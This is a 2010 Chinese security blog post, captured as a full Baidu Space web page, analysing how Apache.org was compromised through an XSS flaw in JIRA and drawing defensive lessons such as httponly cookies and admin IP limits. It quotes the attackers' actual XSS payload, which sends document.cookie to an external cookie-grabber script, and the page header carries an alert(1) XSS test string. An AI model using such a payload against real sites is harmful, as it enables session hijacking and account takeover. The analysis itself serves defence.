                                    <!DOCTYPE html><html  id="customDoc"><!--STATUS OK--> <head> <meta http-equiv=Content-Type content="text/html; charset=utf-8"> <title> 2.0时代的安全启示_5up3rh3i&#39;blog_百度空间</title> <link rel="shortcut icon" href="http://hi.bdimg.com/static/qbase/img/mod/16_favicon.ico?v=116ba471.ico" type=image/x-icon>   <meta name=keywords content="2.0时代的安全启示,"> <meta name=description content="&lt;script&gt;/*///*/alert(1);&lt;/script&gt;
GTalk:5up3rh3i@gmail.com,2.0时代的安全启示"><script>window.wpo={start:new Date*1,pid:109,page:'qing'}</script><!--[if IE]><script type="text/javascript">(function(){var e="abbr,article,aside,audio,canvas,datalist,details,dialog,eventsource,figure,footer,header,hgroup,mark,menu,meter,nav,output,progress,section,time,video".split(","),t=e.length;while(t--)document.createElement(e[t])})();</script><![endif]--><script>window.qDomain={"qing":"http://hi.baidu.com","static":"http://hi.bdimg.com","passport":"https://passport.baidu.com","portrait":"http://tx.bdimg.com","hiup":"http://hi.baidu.com","photo":"http://hiphotos.baidu.com","message":"http://msg.baidu.com","friend":"http://frd.baidu.com","mp3":"http://mp3.baidu.com","ting":"http://ting.baidu.com","image":"http://img.baidu.com","qup":"http://upload.hi.baidu.com","www":"http://www.baidu.com"};window.qUserInfo={"userName":"hi_heige","nickname":"hi_heige","portrait":"a93f68695f6865696765fa04","qingUrl":"\/hi_heige","spaceName":"5up3rh3i\&#39;blog","right":"0","avatarStatus":"1","flagNeedInvite":"0","flagNotInvited":"0","version":"2"};window.qVisitorInfo={"userName":"","nickname":"","portrait":"","isHost": false,"isRandUrl": false,"isForceMoved": false,"loginStatus":"not_login","isOldUser":0,"qingUrl":"","right":"0","version":"0"};window.qPageInfo={"pageUrl":"http:\/\/hi.baidu.com\/hi_heige\/item\/de5df9f3ca071814d6ff8c5e","referUrl":""};window.qUserAvatar={size20:"http://hiphotos.baidu.com/space/scrop=20;q=100/sign=536115cc0fb30f2431c4ab5cb8a8e373/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg",size40:"http://hiphotos.baidu.com/space/scrop=40;q=100/sign=275b84b942a7d933bbf6a32cdd76e523/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg",size65:"http://hiphotos.baidu.com/space/scrop=65;q=100/sign=6a4f52aec895d143de28a37c03cdb437/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg",size110:"http://hiphotos.baidu.com/space/scrop=110;q=100/sign=b0caf9930cf3d7ca08a8782982228f38/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg",size160:"http://hiphotos.baidu.com/space/scrop=160;q=100/sign=b0caf9930cf3d7ca08a8782982228f3f/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg"};window.qVisitorAvatar={size20:"",size40:"",size65:"",size110:"",size160:""};window.qBdsToken="the fisrt two args should be string type:0,1!";window.qErrorInfo={"no":"0","msg":""};window.qServerInfo={"timeStamp":"1428996223"};window.qLongPolling={"url":"http:\/\/m.hi.baidu.com\/i\/msg\/listen"}</script><!--[if (lt IE 8.0)]><link href="http://hi.bdimg.com/static/qbase/css/qbase.css?v=d097b2a7.css" type=text/css rel=stylesheet><![endif]--><!--[if (!IE)|(gte IE 8.0)]><!--><link href="http://hi.bdimg.com/static/qbase/css/qbase_datauri.css?v=c2391e47.css" type=text/css rel=stylesheet><!--<![endif]-->     <!--[if (lt IE 8.0)]><link rel=stylesheet type=text/css href="http://hi.bdimg.com/static/qcomment/css/qcomment.css?v=5ba753ab.css"><![endif]--><!--[if (!IE)|(gte IE 8.0)]><!--><link rel=stylesheet type=text/css href="http://hi.bdimg.com/static/qcomment/css/qcomment_datauri.css?v=a90beb01.css"><!--<![endif]--><link rel=stylesheet type=text/css href="http://hi.bdimg.com/static/qhome/css/common/mod_userInfo.css?v=86bf4259.css">    <!--[if (lt IE 8.0)]><link type=text/css rel=stylesheet href="http://hi.bdimg.com/static/qhome/css/detail/n0001/detail.css?v=2247b49c.css"><![endif]--><!--[if (!IE)|(gte IE 8.0)]><!--><link type=text/css rel=stylesheet href="http://hi.bdimg.com/static/qhome/css/detail/n0001/detail_datauri.css?v=8b3028a2.css"><!--<![endif]-->     <link rel=stylesheet type=text/css href="http://hi.bdimg.com/static/qpublish/css/editor/shCoreDefault.css?v=79e715f0.css">  <style type="text/css"></style>     <script src="http://hi.bdimg.com/static/qbase/js/qing/qing.js?v=4d5f41d2.js"></script>  <script>
    /*最终页页面变量*/ 
    window.detailPage = {
        threadId : "de5df9f3ca071814d6ff8c5e",
        blogTitle: "2.0时代的安全启示" || "无标题",
        contentType : "text",
        originAuthorName : "",
        originPortrait : "",
        originThreadId : ""
    }; 
    </script><script>wpo.head=new Date*1;</script> </head> <body>  <header class=mod-topbar id=modTopbar><iframe class=mod-topbar-bgframe></iframe><div class=mod-topbar-pseudo-real><div class="wrapper-box clearfix"><div class=left-box><a href="http://hi.baidu.com" class=logo-box><span id=baiduSpaceLogo class=q-logo></span></a></div> <div class=center-box><ul class=q-menubox>  <li class="q-menuitem q-newicon"> <a href=http://xiangce.baidu.com target=_blank>相册</a>  <li class="q-menuitem " id=qMenuRecommend><a href="http://hi.baidu.com/index/">广场</a><li class="q-menuitem q-newicon q-menu-item-game"><a href=http://youxi.baidu.com/yxpm/pm.jsp?pid=10106000091_970983 target=_blank>游戏</a><div class=q-game-frame><iframe src=about:blank frameborder=no border=0 scrolling=0></iframe></div></ul></div>  <div class=right-box><ul class=q-navbox><li class=q-navitem> <a href="http://hi.baidu.com/go/login">登录</a><li class="q-navitem q-nav-sp"><span></span><li class=q-navitem><a href="http://hi.baidu.com/go/reg?pmfrom=qingtop">注册</a> </ul><div class="right mod-qhome-follow-box"><a href="#" class="follow-btn a-btn-follow qing-stat-nsclick" data-nsclick=20121012follow_hdbtnaddcare>关注此空间</a></div> </div> </div></div></header>  <section class=mod-page-body> <div class="mod-page-main wordwrap clearfix">  <div class=x-page-container>    <section class="mod-topspaceinfo mod-cs-header"><div class=head-topbar></div><div class=container><h1><a class="space-name cs-header-spacename" href="/hi_heige">5up3rh3i&#39;blog</a></h1><p class="space-description cs-header-spacesummary"> /*///*/alert(1); 
GTalk:5up3rh3i@gmail.com</p></div><div class=head-footer></div></section>   <div class=mod-blogpage-wraper> <div class="blog-bg-main-repeat hide"></div>  <div class="grid-80 mod-blogpage"> <div class="blog-bg-main hide"></div>    <div class="mod-text-content mod-post-content mod-cs-contentblock"> <div class=cs-contentblock-bg></div>   <div class="content-head clearfix">  <div class=content-other-info>  <span>2010-04-15 20:23</span>  </div>   <h2 class="title content-title">2.0时代的安全启示</h2>  </div>  <div id=content class="content mod-cs-content text-content clearfix"> <p>2.0时代的安全启示</p><p>web 2.0的时代，对应的都要上升到2.0 。如：pen-test 2.0 、sec 2.0等，在我上一篇blog《<a target="_blank" href="http://hi.baidu.com/hi%5Fheige/blog/item/a30b6af10153f6cf7931aadc.html">xss露脸了</a>》里写的Apache基金会被黑的事情，今天在cnbeta上看到了大牛素包子写的一篇文章《<a target="_blank" href="http://cnbeta.com/articles/108698.htm">黑客攻破Apache.org官网安全问题发人深思</a>》分析了被攻击的全过程，其实这个过程用的技术都是老技术了，唯一亮点就是tinyurl的使用。关于xss在渗透里的利用让我想起来以前的一些文章：</p><p>《著名国际黑客站点zone-h.org被黑事件》 <a href="http://baoz.net/hack-the-zone-h/">http://baoz.net/hack-the-zone-h/</a><br />《xss简单渗透测试》 <a href="http://www.80sec.com/xss-how-to-root.html">http://www.80sec.com/xss-how-to-root.html</a><br />《xss/csrf in penetration test》<a href="http://superhei.blogbus.com/logs/11257167.html">http://superhei.blogbus.com/logs/11257167.html</a><br />《警惕Third Party Content攻击》<a href="http://hi.baidu.com/hi_heige/blog/item/eaa93c72599b241b8701b0f9.html">http://hi.baidu.com/hi_heige/blog/item/eaa93c72599b241b8701b0f9.html</a></p><p>根据素包子的文章和blog里的其他文章描叙，安全启示趋向 1.0：</p><p>&ldquo;相对短平快的方法是要求重要的人员、重要的应用、重要的系统使用双因素动态密码认证&rdquo;</p><p>他提到的重点趋向密码认证，但是在这次攻击过程，密码认证只是一个中介利用过程，在具体的渗透了还有其他很多的方法替换这个过程【比如内网嗅探，直接exp打】。在2.0时代，我们应该重点应该放在他任何打开大门的攻击上，也就是通过xss得到webshell的过程。具体的被利用的xss漏洞详细见：<a href="http://tacticalwebappsec.blogspot.com/2010/04/apacheorg-compromised-through-xss.html">http://tacticalwebappsec.blogspot.com/2010/04/apacheorg-compromised-through-xss.html</a></p><p>The end URL destination that they attackers send the Apache admins to was this (with some data obscured) -</p><p>&nbsp;&nbsp;&nbsp;  &gt;<br />&nbsp;&nbsp;&nbsp;  &lt;script&gt;document.write('&lt;img%20src=&quot;<a>http://teap.zzl.org/teap.php?data='%2bdocument.cookie%2b'&quot;/&gt;');window.location=&quot;http://pastie.org/904699</a>&quot;;<br />&nbsp;&nbsp;&nbsp;  &lt;/script&gt;&lt;script&gt;&lt;!--&amp;defaultColor=';try{//</p><p>As you can see, the attack is using some html/javascript tricks to force the user's browser to send the &quot;document.cookie&quot; DOM object data off site to the attacker's cookie grabber app (teap.php). The attack payload is using an easy browser trick by placing the javascript data inside of an html IMG tag which makes it possible to bypass the DOM restrictions about different domains access cookie data from other domains.</p><p>Here is how the XSS payloads looks if echoed back from JIRA -</p><p>&nbsp;&nbsp;&nbsp;  &lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;<br />&nbsp;&nbsp;&nbsp;  &lt;!--<br />&nbsp;&nbsp;&nbsp;  var defaultColor = '';try{//';<br />&nbsp;&nbsp;&nbsp;  var choice = false;<br />&nbsp;&nbsp;&nbsp;  var openerForm = opener.document.jiraform;<br />&nbsp;&nbsp;&nbsp;  var openerEl = opener.document.jiraform.name;}catch(e){}<br />&nbsp;&nbsp;&nbsp;  --&gt;&lt;/script&gt;&lt;noscript&gt;&lt;meta equiv=&quot;refresh&quot; content=&quot;0;url=http://pastie.org/904699&quot;&gt;&lt;/noscript&gt;&lt;script&gt;document.write('&lt;img src=&quot;<a>http://teap.zzl.org/teap.php?data='+document.cookie+'</a>&quot; /&gt;');window.location=&quot;&gt;&lt;!--;<br />&nbsp;&nbsp;&nbsp;  function colorIn(color) {<br />&nbsp;&nbsp;&nbsp;  if (!choice) {<br />&nbsp;&nbsp;&nbsp;  openerEl.value = color;<br />&nbsp;&nbsp;&nbsp;  document.f.colorVal.value = color;<br />&nbsp;&nbsp;&nbsp;  }<br />&nbsp;&nbsp;&nbsp;  }<br />&nbsp;&nbsp;&nbsp;  <br />&nbsp;&nbsp;  一个典型的DOM-XSS，可以看得出来攻击者xss-playload的水平也咋的？ 用的简单得到cookie的方式远程登录，没考虑服务端的限制比如httponly ，ip限制等，也没考虑到客服端的防御，比如ff的noscript插件，ie8的过滤，还有Chrome、ie8的xss过滤等....<br />  对于JIRA这样一个公开的程序， 最起码也直接用个远程js放playload直接实现上传得到webshell的过程 ：）<br />&nbsp;&nbsp;  <br />&nbsp;&nbsp;  至于安全启示我们就有了：<br />&nbsp;&nbsp;  <br />&nbsp;&nbsp;  1.对于公开的应用程序，也要审计后使用，尤其是对2.0时代漏洞类型的审计，不要忽视你认为&lsquo;鸡肋&rsquo;的漏洞。<br />&nbsp;&nbsp;  2.加强设置，比如设置下httponly、后台ip限制、数据于代码分离、删除自带的Third Party Content等。<br />&nbsp;&nbsp;  3.安全培训，加大对2.0时代的攻击手法的认识，不要访问来历不名的url，客服端使用noscript等安全插件。&nbsp;&nbsp;</p> </div>    <div class="mod-tagbox clearfix"> </div> <div class="mod-post-info clearfix">  <div class=x-bdshare>  <div id=bdshare class="bdshare_t bds_tools get-codes-bdshare" data="{'wbuid':1727466295}"> <span class=bds_more>分享到：</span> <a class=bds_qzone></a> <a class=bds_tsina></a> <a class=bds_tqq></a> <a class=bds_renren></a> </div> <script id=bdshare_js data="type=tools&amp;uid=713670"></script> <script id=bdshell_js></script> <script>
        var bds_config = {'bdTop':240};
                    var all_img = qing.g('content').getElementsByTagName('img');
            if(all_img.length>0){
                bds_config.bdPic = all_img[0].src;
            }
                document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?v=72836429.js?cdnversion=" + Math.ceil(new Date()/3600000);
    </script> </div> <div class="op-box mod-cs-opBox">  <a class="report-btn hide" target=_blank href="#"> 举报 </a>  <span class=pv>浏览(1209)</span> <a class=comment-bnt id=commentBnt href="#" onclick="return false"> 评论<span class=comment-nub>(5)</span> </a>   <a href="#" id=shareBnt onclick="return false" class=share-bnt> 转载<span id=shareNub class=share-nub></span> </a>   </div> </div>   </div>    <div class=mod-share-detail id=shareDetail style=display:none></div>   <div class=mod-relate-blogs id=relateBlog> <h3 class=relate-title>你可能也喜欢</h3> <ul class="relate-blog-list clearfix">   <li  class=first > <a href="http://hi.baidu.com/tqtdmozbilboqwq/item/479e257377ea9d206e29f687" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://b.hiphotos.baidu.com/space/scrop=90/sign=d957c690baa1cd1101e8357fc92ff1cc/54fbb2fb43166d226ec13734462309f79152d2df.jpg" class=relate-img alt="北京笔记，饶峰饶浩成最精彩博语（短语）荟萃（五十三）" title="北京笔记，饶峰饶浩成最精彩博语（短语）荟萃（五十三）"> </a> <a href="http://hi.baidu.com/tqtdmozbilboqwq/item/479e257377ea9d206e29f687" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>北京笔记，饶峰饶浩成最精彩博语（短语）荟萃（五十三）</a>    <li > <a href="http://hi.baidu.com/maqungang/item/6e4534f0d81210ec1a111fd2" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://b.hiphotos.baidu.com/space/scrop=90/sign=d957c690baa1cd1101e8357fc92ff1cc/54fbb2fb43166d226ec13734462309f79152d2df.jpg" class=relate-img alt="科学家发现最小细菌 体积达到生命极限" title="科学家发现最小细菌 体积达到生命极限"> </a> <a href="http://hi.baidu.com/maqungang/item/6e4534f0d81210ec1a111fd2" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>科学家发现最小细菌 体积达到生命极限</a>    <li > <a href="http://hi.baidu.com/macks/item/343159e41b7656f4e1a5d474" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://d.hiphotos.baidu.com/space/scrop=90/sign=853d7b03a9773912c078c23e8824bf28/a2cc7cd98d1001e94a3f29b1b80e7bec54e79708.jpg" class=relate-img alt="子午随风发布的文字" title="子午随风发布的文字"> </a> <a href="http://hi.baidu.com/macks/item/343159e41b7656f4e1a5d474" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>子午随风发布的文字</a>    <li > <a href="http://hi.baidu.com/luckystar668/item/a63b617d9f7f3011d0dcb3ec" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://f.hiphotos.baidu.com/space/scrop=90/sign=77f0bf1ce950352ab53f6257237ec2c2/d53f8794a4c27d1e9f188b6f1bd5ad6eddc4385a.jpg" class=relate-img alt="哪因素容易引起白血病？3招教你有效预防 ​" title="哪因素容易引起白血病？3招教你有效预防 ​"> </a> <a href="http://hi.baidu.com/luckystar668/item/a63b617d9f7f3011d0dcb3ec" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>哪因素容易引起白血病？3招教你有效预防 ​</a>    <li > <a href="http://hi.baidu.com/qcyl27/item/1b4ffefe5029d2f2a935a2eb" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://d.hiphotos.baidu.com/space/scrop=90/sign=05323e18aeaf2eddd0af0eb6fd2d38d9/0e2442a7d933c895a278d865d31373f0820200ad.jpg" class=relate-img alt="卡西尼号探测器变轨奔赴土星的“冰月亮”" title="卡西尼号探测器变轨奔赴土星的“冰月亮”"> </a> <a href="http://hi.baidu.com/qcyl27/item/1b4ffefe5029d2f2a935a2eb" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>卡西尼号探测器变轨奔赴土星的“冰月亮”</a>    <li > <a href="http://hi.baidu.com/yxylq/item/1ec1235c6a0e5adcd58bacf9" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://h.hiphotos.baidu.com/space/scrop=90/sign=7ef067cda044ad342ae1c0d8a09f35c4/d1160924ab18972b3bd4c5eae7cd7b899e510a20.jpg" class=relate-img alt="科学家称木星曾摧毁太阳系 幸好土星力挽狂澜" title="科学家称木星曾摧毁太阳系 幸好土星力挽狂澜"> </a> <a href="http://hi.baidu.com/yxylq/item/1ec1235c6a0e5adcd58bacf9" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>科学家称木星曾摧毁太阳系 幸好土星力挽狂澜</a>    <li > <a href="http://hi.baidu.com/hi_heige/item/3f70b730308bcac51a96965e" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://a.hiphotos.baidu.com/space/scrop=90/sign=b8ba13bf720e0cf3a4a909a47a7bcb2f/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg" class=relate-img alt="大牛Collin Jackson的一些links" title="大牛Collin Jackson的一些links"> </a> <a href="http://hi.baidu.com/hi_heige/item/3f70b730308bcac51a96965e" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>大牛Collin Jackson的一些links</a>   </ul> </div>   <div class="mod-detail-pager clearfix">  <div class=detail-nav-pre> <a href="http://hi.baidu.com/hi_heige/item/003c91d9f3ce993ce2108f5e" hidefocus title="上一篇"></a> </div>   <div class=detail-nav-next> <a href="http://hi.baidu.com/hi_heige/item/8dbe41127fc06dfc9d778a5e" hidefocus title="下一篇"></a> </div>  </div>   <div id=commentDetail class="mod-comment-detail clearfix mod-cs-comment">   <div class=comment-title>评论</div> <div class=comment-content></div> </div>   </div>  </div>  </div> </div> </section>  <footer class="mod-footer mod-cs-footer"><div class="clearfix hidden-box"></div><div class=footer-box><div class=inner-box><a href=http://help.baidu.com/question?prod_en=hi target=_blank>帮助中心</a><span>&nbsp;|&nbsp;</span><a href=http://tieba.baidu.com/p/1781683739 target=_blank>空间客服</a><span>&nbsp;|&nbsp;</span><a href=http://tousu.baidu.com/hi/add target=_blank>投诉中心</a><span>&nbsp;|&nbsp;</span><a href=http://www.baidu.com/search/hi_contract.html target=_blank>空间协议</a></div><div class=copy-box>&copy;2015&nbsp;Baidu</div></div></footer>  <script src="http://hi.bdimg.com/static/qbase/js/mod/mod_foot.js?v=382c615f.js"></script> <script>
        	qing.dom.ready(function(){
                if (qVisitorInfo.loginStatus == 'activated'){
                    qext.stat.ns('m_20121012_loga_num');
					qext.fn.setStoken();
				}
			});
        </script>        <script>qext.stat.ns('m_20120425_n0001');</script>  <script src="http://hi.bdimg.com/static/qcomment/js/qcmt_import.js?v=ac96f988.js"></script>  <script src="http://hi.bdimg.com/static/qpublish/js/editor/shCore.js?v=805e084f.js"></script> <script>
        SyntaxHighlighter.highlight();
    </script>   <script src="http://hi.bdimg.com/static/qhome/js/detail/20001/detail.js?v=3d7781df.js"></script>   <script>wpo.tti=new Date*1;</script><script src="http://hi.baidu.com/cm/static/js/allsite.js?v=75674092.js?v=201504141523"></script><script>document.write(unescape("%3Cscript src='http://hm.baidu.com/h.js%3F8c869b543955d43e496c2efee5b55823' type='text/javascript'%3E%3C/script%3E"));qext.stat.ns('m_20120713_qing_pv');</script>